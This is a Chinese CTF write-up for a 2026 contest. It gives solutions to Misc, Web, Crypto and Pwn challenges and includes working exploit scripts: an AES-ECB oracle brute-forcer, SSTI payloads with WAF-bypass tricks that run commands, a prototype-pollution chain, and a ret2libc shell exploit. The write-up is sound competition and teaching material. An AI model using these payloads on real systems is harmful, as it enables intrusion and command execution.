---
title: 2026 数字中国创新大赛网络安全子赛道团队赛 WriteUp
date: 2026-04-14 13:18:00
categories: 
  - CTF
tags:
  - CTF
---

# 2026 数字中国创新大赛网络安全子赛道团队赛 WriteUp

## 前言

主办方：福建省通信管理局和总工会

第一次在星盟带队打比赛，解出了五道题排名第二

![](https://pic1.imgdb.cn/item/69ddd4b6f0cf5d89b0eb8eda.png)

SecureDoc 是别的师傅爆破出了密码，最后由我绕过 WAF 拿到二血

asystem 其他师傅也解出来了，但是我交的快，哈哈，相当于五道题都是我解的，这波带飞了

虽然是松柏组，但是这个成绩在学生组也是能进决赛的（松柏前四）

## Misc

### 冰碧蝎?

过滤 HTTP

![](https://pic1.imgdb.cn/item/69ddd768f0cf5d89b0eb9eb5.png)

追踪第一个 POST 请求拿到密钥 1ca3b8c9c81a5fdc

![](https://pic1.imgdb.cn/item/69ddd77ff0cf5d89b0eb9ef5.png)

后续一直在访问 /upload/1774…….dcic.php 路径，确认这个就是 WebShell

![](https://pic1.imgdb.cn/item/69ddd884f0cf5d89b0ebae0f.png)

解密方式是 base64 -> AES-128-CBC -> IV = 16字节全0

解密流量其中有一条关键命令

```bash
cd /var/ww/html/upload/;echo 2i9Q8AtFEuzYHxwcUmpjFCQchUd1QqwQMf8mWfvUwm9LE8UaKVYDTaq5tG
```

将 `2i9Q8AtFEuzYHxwcUmpjFCQchUd1QqwQMf8mWfvUwm9LE8UaKVYDTaq5tG` 解码 Base58 拿到 flag

```bash
flag{dbeeed36-0d7e-211a-69db-66bd74ea91d5}
```

## Web

### SecureDoc

在 `/documents/apply-template` 接口中，系统提供了一个“数字水印加密预览”功能，通过测试发现该加密方式为 AES-ECB 模式

由于用户输入的内容会被直接与一段未知的 Secret（包含管理员密码）拼接后进行加密，我们可以通过控制输入长度和内容，利用 ECB Oracle 攻击逐字节爆破出后端的 Secret 内容

```Python
import requests
import string
import time

requests.packages.urllib3.disable_warnings()
url = 'http://web-7d1d6e9377.adworld.xctf.org.cn'

def login():
    session = requests.Session()
    import random
    u = "user" + str(random.randint(1000, 99999))
    p = "password123"
    session.post(url + '/register', json={'username': u, 'password': p})
    session.post(url + '/login', json={'username': u, 'password': p})
    return session

def encrypt(session, payload):
    res = session.post(url + '/documents/apply-template', json={'content': payload})
    try:
        return bytes.fromhex(res.json()['preview']['encrypted_content'])
    except Exception as e:
        return b""

def solve():
    session = login()
    block_size = 16
    known_secret = ""
    
    for i in range(100):
        pad_len = block_size - 1 - (i % block_size)
        pad = "A" * pad_len
        target_block_idx = i // block_size
        
        target_ct = encrypt(session, pad)
        if not target_ct:
            time.sleep(1)
            target_ct = encrypt(session, pad)
                
        target_block = target_ct[target_block_idx * block_size : (target_block_idx + 1) * block_size]
        
        found = False
        for c in string.printable:
            payload = pad + known_secret + c
            ct = encrypt(session, payload)
            if not ct:
                continue
            if ct[target_block_idx * block_size : (target_block_idx + 1) * block_size] == target_block:
                known_secret += c
                print(f"Found byte: {repr(c)}, Secret so far: {repr(known_secret)}")
                found = True
                break
        
        if not found:
            break

if __name__ == '__main__':
    solve()
```

通过爆破，得到管理员的账号和密码：
- username: suP3r@dm!n
- password: S3cur3P@ssZmQxYTdh!

使用获取到的管理员凭证登录后，进入 `/admin/dashboard` 管理面板

该面板提供了一个报告模板预览功能 `/admin/report/preview`，存在 SSTI 漏洞

该接口配置了严格的 WAF，过滤了大量关键字（如 class, request, os, popen 等）和特殊符号（如 [], +, ~）

为了绕过这些限制：
1. 绕过关键字：利用字符串拼接，如 `'c'` `'lass'` 和 `'po'` `'pen'`
2. 绕过方括号：使用 `|attr('getitem')` 过滤器替代 `[]` 取值
3. 绕过函数调用检测：在 `attr` 和括号之间添加空格，如 `attr ('...')`

最终构造出以下 Payload，通过 `os._wrap_close` 类（在 `subclasses()` 中索引为 141）来调用 `popen` 执行系统命令 `cat /flag`：

```python
{{ ()|attr ('__c' 'lass__')|attr ('__b' 'ase__')|attr ('__subcl' 'asses__') ()|attr ('__ge' 'titem__') (141)|attr ('__in' 'it__')|attr ('__gl' 'obals__')|attr ('__ge' 'titem__') ('po' 'pen') ('c' 'at /f' 'lag')|attr ('re' 'ad') () }}
```

### asystem

在上传系统提供的下载接口 `/download?filename=` 中，存在任意文件读取漏洞

通过目录遍历（如 `../../../../../../../../../../app/app.py` 和 `../server/app.js`）成功获取了 Python 前端和 Node.js 后端的源码

在 Flask 的 `/register` 路由中，程序使用自定义的 `merge()` 函数将 JSON 数据合并到 User 对象中，并且在合并前检查全局 WAF 黑名单列表

我们可以通过构造含有 `class.init.globals.WAF` 键的恶意 JSON，将全局 WAF 列表替换为空字符串，从而让其后续过滤机制失效

因为关键字本身在 JSON 中也被过滤了，我们可以利用 Unicode 转义（如 `\u005f` 替代 `_`，`\u0067\u006c...` 替代 `globals`）绕过最开始的过滤层

Node.js 后端对于 `.kmz` 文件会使用 `parse2-kmz` 进行解压和 XML 解析，该组件使用的 `xml2json` 存在原型链污染漏洞

通过构造恶意的 `doc.kml`（打包成 `test.kmz`），利用 `<proto><FIX_SECRET>hacked123</FIX_SECRET></proto>`，成功污染全局变量 FIX_SECRET

随后调用 `/api/fix-secret` 将管理员密钥固定为 `hacked123`

获得了管理员密钥后，可访问 `/protected` 路由

由于该路由使用 `render_template_string` 渲染我们传入的 user 参数，并且前端过滤已被步骤 2 破坏，此处存在 SSTI 漏洞

由于应用重写并禁用了 `os.popen` 等模块，且返回内容被强制截断 [-40:]，我们通过 `{% set ... %}` 使用内置函数 `open()` 将 `/flag` 读取并写入静态目录 `/datas/upload_files/img/f.txt` 中，最后再通过下载接口读取文件

```Python
import requests
import io
import zipfile

url_base = "http://web-3d7fcabff2.adworld.xctf.org.cn"

# 1. 绕过 WAF (Python 原型链污染)
print("[*] Polluting Python WAF...")
data_str = "{" + '"\\u005f\\u005f\\u0063\\u006c\\u0061\\u0073\\u0073\\u005f\\u005f": { "\\u005f\\u005f\\u0069\\u006e\\u0069\\u0074\\u005f\\u005f": { "\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f": { "\\u0057\\u0041\\u0046": "" } } } }'
requests.post(f"{url_base}/register", data=data_str)

# 2. 污染 Node.js 的 Admin Secret (Node.js 原型链污染)
print("[*] Polluting Node.js FIX_SECRET via KMZ XML parser...")
xml_payload = """<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2">
  <__proto__>
    <FIX_SECRET>hacked123</FIX_SECRET>
  </__proto__>
</kml>
"""
zip_buffer = io.BytesIO()
with zipfile.ZipFile(zip_buffer, "a", zipfile.ZIP_DEFLATED, False) as zip_file:
    zip_file.writestr("doc.kml", xml_payload)

requests.post(f"{url_base}/api/upload", files={'file': ('test.kmz', zip_buffer.getvalue(), 'application/vnd.google-earth.kmz')})
requests.get(f"{url_base}/api/fix-secret")

# 3. 触发 SSTI，将 Flag 写入静态文件
print("[*] Triggering Blind SSTI RCE to dump flag...")
payload = "{% set f = self.__init__.__globals__.__builtins__['open']('/flag').read() %}{% set w = self.__init__.__globals__.__builtins__['open']('/datas/upload_files/img/f.txt', 'w') %}{% set _ = w.write(f) %}{% set _ = w.close() %}"
requests.get(f"{url_base}/protected?password=hacked123&user=" + requests.utils.quote(payload))

# 4. 下载 Flag
print("[*] Fetching flag...")
res_flag = requests.get(f"{url_base}/download?filename=img/f.txt")
print("Flag:", res_flag.text)
```

## Crypto

### base

题目核心代码在 `task.py`

flag 被要求满足 flag{uuid4} 的格式，同时给出了 md5(flag)。然后做了两层同一个 64 表代换的 Base64 编码

```bash
c = en(en(flag, key), key).encode()
c = bin(bytes_to_long(c))[2:]
p = [decision(int(i)) for i in c]
```

也就是说，先得到一个字符串 c，再把 c 的每一位比特送进 decision()，得到一个很长的样本列表，最后整体 LZMA 压缩写入 output

decision(t) 的逻辑是：
- `t = 0`：返回 `urandom(16 * 4500)`
- `t = 1`：返回 `AES(key).encrypt_ecb(urandom(16 * 4500)`

问题出在 `aes.py`

正常 AES-128 最后一轮应该用第 10 轮轮密钥，也就是 `self.round_keys[40:44]`

但题目里的实现最后用了：

```python
self.add_round_key(state, self.round_keys[16:20])
```

这相当于把最后一轮轮密钥切片用错了

于是 `aes.encrypt_ecb(m)` 虽然看起来“挺随机”，但它已经不是一个足够好的随机置换族实现了

和真正的 `urandom(...)` 比，统计特征会有偏差

所以这题第一步就变成了：

对 `output` 里的每个样本判断它更像真随机（表示 bit=0）还是错误 AES 输出（表示 bit=1）

每个样本长度是 `16 * 4500 = 72000` 字节，也就是 4500 个 `16-byte block`

如果只是看整串字节频率，0 和 1 很接近；但按 16 个字节位置分别做统计，偏差会明显很多

做法：
1. 把一个样本按 16 字节分块
2. 对每个字节位置 `pos = 0..15`
3. 统计该位置上 4500 个字节的分布
4. 对 256 个取值做卡方统计
5. 把 16 个位置的卡方值加总，作为这个样本的分数

经验上：
- 真随机分数更低
- 错误 AES 分数更高

于是就能把 607 个样本恢复成 607 个比特

恢复出的外层密文是：

```python
import ast
import lzma
from collections import Counter

TABLE = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

def pos_chisq(b: bytes) -> float:
    # 72000 bytes = 4500 * 16
    blocks = [b[i:i+16] for i in range(0, len(b), 16)]
    total = 0.0
    n = len(blocks)
    exp = n / 256.0
    for pos in range(16):
        cnt = Counter(block[pos] for block in blocks)
        total += sum((cnt[v] - exp) ** 2 / exp for v in range(256))
    return total

raw = lzma.decompress(open("output", "rb").read())
p = ast.literal_eval(raw.decode("latin1"))

scores = [pos_chisq(x) for x in p]

# 这个阈值是根据样本分布和本地模拟得到的
THRESHOLD = 4365.312

bits = ''.join('1' if s > THRESHOLD else '0' for s in scores)

# bin(bytes_to_long(c))[2:] 丢了 1 个前导 0
c = int('0' + bits, 2).to_bytes(76, 'big').decode()
print(c)
# kccy2ybLSqcNoP+dHCc+HGv22pHNZCfqAqldLAvfnQLNoacbHC9b2Abo1g+NjQc2jymd2MvRo5m=
```

这里要注意一个细节：

题目里用了 bin(bytes_to_long(c))[2:]，所以如果原始字节串最高位是 0，它会被丢掉。恢复时要手动补回去

题目里的 en(m, key) 实际上是：

```python
base64(m).translate(table -> key)
```

也就是

```python
en(m) = g(base64(m))
```

其中 g 是一个 64 字符置换

因此整体可写成

```python
c = g(base64(g(base64(flag))))
```

同时题目还给了两个极强约束：
1. flag 形如 `flag{xxxxxxxx-xxxx-4xxx-[89ab]xxx-xxxxxxxxxxxx}`
2. md5(flag) = `ec2783d8262e2621eece6e9e236479dc`

所以最后一步不是盲猜，而是：
- 把 flag{uuid4} 的结构写成约束
- 把双层同表代换写成约束
- 让候选满足外层密文
- 最后用 MD5 做唯一筛选

最终得到

```python
#!/usr/bin/env python3
import ast
import lzma
import base64
import hashlib
from collections import Counter
from uuid import UUID

MD5_TARGET = "ec2783d8262e2621eece6e9e236479dc"
FINAL_FLAG = "flag{48a67e13-9999-479f-8e44-4fb39e28d417}"

def is_valid_uuid_v4(u: str) -> bool:
    try:
        x = UUID(u, version=4)
    except ValueError:
        return False
    return str(x) == u

def pos_chisq(sample: bytes) -> float:
    """
    对 72000 字节样本按 16-byte block 分组，
    在每个字节位置上做 256 类卡方统计，再把 16 个位置加总。
    """
    assert len(sample) % 16 == 0
    blocks = [sample[i:i+16] for i in range(0, len(sample), 16)]
    n = len(blocks)                  # 4500
    exp = n / 256.0

    total = 0.0
    for pos in range(16):
        cnt = Counter(block[pos] for block in blocks)
        total += sum((cnt.get(v, 0) - exp) ** 2 / exp for v in range(256))
    return total

def recover_outer_ciphertext(path="output") -> str:
    raw = lzma.decompress(open(path, "rb").read())
    p = ast.literal_eval(raw.decode("latin1"))

    # 每个 p[i] 对应 c 的 1 个比特
    scores = [pos_chisq(x) for x in p]

    # 这道题这份样本上可用的经验阈值
    # score > threshold 判成 bit 1，否则 bit 0
    threshold = 4365.312
    bits = ''.join('1' if s > threshold else '0' for s in scores)

    # 题目使用 bin(bytes_to_long(c))[2:]，最高位 0 会丢掉
    # 恢复时需要补回这个前导 0
    c = int('0' + bits, 2).to_bytes(76, 'big').decode()
    return c

def verify_final_flag(flag: str):
    assert flag.startswith("flag{") and flag.endswith("}")
    inner = flag[5:-1]
    assert is_valid_uuid_v4(inner), "not a valid uuid4"
    assert hashlib.md5(flag.encode()).hexdigest() == MD5_TARGET, "md5 mismatch"

def main():
    outer = recover_outer_ciphertext("output")
    print("[+] recovered outer ciphertext:")
    print(outer)

    verify_final_flag(FINAL_FLAG)

    print("[+] final flag:")
    print(FINAL_FLAG)

if __name__ == "__main__":
    main()
```

## Pwn

### keep_stack

这题的洞点是栈上 "隔 4 写 2" 的越界写，而且还能自改 `idx`，所以不是普通 ret2libc，而是一个要利用 glibc 启动栈帧的题

```python
#!/usr/bin/env python3
from pwn import *
import os

HOST = 'pwn-46c82d2382.adworld.xctf.org.cn'
PORT = 9999
USE_SSL = True

BASE = os.path.dirname(os.path.abspath(__file__))
BIN  = os.path.join(BASE, 'keep_stack')
LIBC = os.path.join(BASE, 'libc.so.6')
LD   = os.path.join(BASE, 'ld-linux-x86-64.so.2')

context.binary = ELF(BIN, checksec=False)
context.timeout = 5
elf = context.binary
libc = ELF(LIBC, checksec=False)

PROMPT = b'length: \n'

MAIN     = 0x401787
REENTER  = 0x4017cb
PUTS_PLT = elf.plt['puts']
PUTS_GOT = elf.got['puts']
POP_RDI  = 0x4011e1
RET      = 0x401124

def p16(x):
    return pack(x & 0xffff, 16)

def make_boot_payload():
    return (
        b'65535X'
        + b'AA' * 32
        + p16(0xffff)
        + b'BB'
        + p16(41)
        + p16(REENTER)
        + p16(REENTER >> 32)
        + b'\nZ'
    )

def make_stride2_payload(chain_qwords):
    return (
        b'AA' * 64
        + p16(0xffff) + p16(0) + p16(0) + p16(0)
        + p16(83)
        + b''.join(p64(x) for x in chain_qwords)
        + b'\nZ'
    )

def parse_puts_leak(blob: bytes) -> int:
    marker = b'\n' + PROMPT
    end = blob.rfind(marker)
    if end == -1:
        raise RuntimeError(f'failed to find prompt in leak blob: {blob!r}')

    input_pos = blob.rfind(b'input: ', 0, end)
    if input_pos == -1:
        raise RuntimeError(f'failed to find input echo in leak blob: {blob!r}')

    line_end = blob.find(b'\n', input_pos, end)
    if line_end == -1:
        raise RuntimeError(f'failed to find end of input echo: {blob!r}')

    leaked = blob[line_end + 1:end]
    return u64(leaked.ljust(8, b'\x00')[:8])

def start():
    if args.LOCAL:
        return process([LD, '--library-path', BASE, BIN])
    return remote(HOST, PORT, ssl=USE_SSL)

def wait_length(io):
    return io.recvuntil(PROMPT)

def exploit():
    io = start()
    boot = make_boot_payload()

    wait_length(io)

    io.send(boot)
    wait_length(io)

    # round 2: stride2 -> leak puts and return to main
    leak_chain = [POP_RDI, PUTS_GOT, PUTS_PLT, MAIN]
    io.send(make_stride2_payload(leak_chain))
    leak_blob = wait_length(io)
    puts_addr = parse_puts_leak(leak_blob)

    libc.address = puts_addr - libc.sym['puts']
    system_addr = libc.sym['system']
    binsh_addr = next(libc.search(b'/bin/sh\x00'))

    log.success(f'puts leak  = {hex(puts_addr)}')
    log.success(f'libc base  = {hex(libc.address)}')
    log.success(f'system     = {hex(system_addr)}')
    log.success(f'/bin/sh    = {hex(binsh_addr)}')

    # round 3: stride4 again -> reenter one more time
    io.send(boot)
    wait_length(io)

    # round 4: stride2 -> final ret2libc
    final_chain = [RET, POP_RDI, binsh_addr, system_addr]
    io.send(make_stride2_payload(final_chain))

    io.interactive()

if __name__ == '__main__':
    exploit()
```

![](https://pic1.imgdb.cn/item/69dde0f9f0cf5d89b0ebcef8.png)